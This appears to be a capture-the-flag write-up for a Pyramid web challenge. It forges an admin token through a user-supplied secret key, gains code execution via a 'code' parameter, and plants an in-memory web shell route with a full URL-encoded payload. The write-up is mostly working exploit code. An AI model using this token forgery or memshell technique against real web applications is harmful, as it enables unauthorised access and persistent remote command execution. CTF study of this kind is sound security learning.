## 1. bypass authentication
```python
        if len(all_data) == 4: # self-defined key
            key_bytes = all_data[3].replace(' ', '+').encode('utf-8')
            key = base64.b64decode(key_bytes)  # bytes
```
we can use our self-difined secret_key:
```python
token = "eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMifQ==.MzA5NmZkYzE4MmI2NmExYmRjZThhZmNmMWFjNzc2ZGVmOTFlOTdhMTc0YTE2NTA0MTRhNzU1NDc4NzZlYjAzYw==.SFM=.MTIzNDU2" # 123456
secret = b"123456"
data = '{"username":"admin","password":"123"}'
json_data = json.loads(data)
data_bytes = (json.dumps(json_data) + secret.decode()).encode('utf-8')
print(data_bytes)
hash_object = hashlib.sha256()
hash_object.update(data_bytes)
print(hash_object.hexdigest())
```

## 2. getshell
### 1. sol1
I think we can directly execute command and concat the result into sth.html
like this:
```python
code = "__import__('os').system('ls >>../Match/static/register.html')"
```

### 2. memshell
The most meaningful one I learned from this.
Look at this :
```python
    with Configurator() as config:
        config.add_route('register_front', '/')
        config.add_route('register_api', '/api/register')
        config.add_route('system_test', '/api/test')
        config.add_route('front_test', '/test')
        config.add_view(system_test, route_name='system_test')
        config.add_view(front_test, route_name='front_test')
        config.add_view(register_api, route_name='register_api')
        config.add_view(register_front, route_name='register_front')
        app = config.make_wsgi_app()
```

It's a hint, we can add our `shell` root!
1. add_route
2. add_view
3. commit (don't forget this!)

And we use lambda to create function,
and function should be like this:
```python
def front_test(request):
    return Response(util.read_html('test.html'))
```
that:
1. have parameter `request`
2. have return value `Response(...)`

And we can use `global()['config']` to get config!!

Final exp:
```python
globals()['config'].add_route("shell","/shell")
globals()['config'].add_view(lambda request: Response(__import__('os').popen(request.params['cmd']).read()),route_name = "shell")
globals()['config'].commit()
```

payload
```python
http://webvm:6543/api/test?code=globals%28%29%5B%27config%27%5D%2Eadd%5Froute%28%22shell%22%2C%22%2Fshell%22%29%3Bglobals%28%29%5B%27config%27%5D%2Eadd%5Fview%28lambda%20request%3A%20Response%28%5F%5Fimport%5F%5F%28%27os%27%29%2Epopen%28request%2Eparams%5B%27cmd%27%5D%29%2Eread%28%29%29%2Croute%5Fname%20%3D%20%22shell%22%29%3Bglobals%28%29%5B%27config%27%5D%2Ecommit%28%29&token=eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMifQ%3D%3D%2EMzA5NmZkYzE4MmI2NmExYmRjZThhZmNmMWFjNzc2ZGVmOTFlOTdhMTc0YTE2NTA0MTRhNzU1NDc4NzZlYjAzYw%3D%3D%2ESFM%3D%2EMTIzNDU2
```

visit:
```
http://webvm:6543/shell?cmd=id
```

END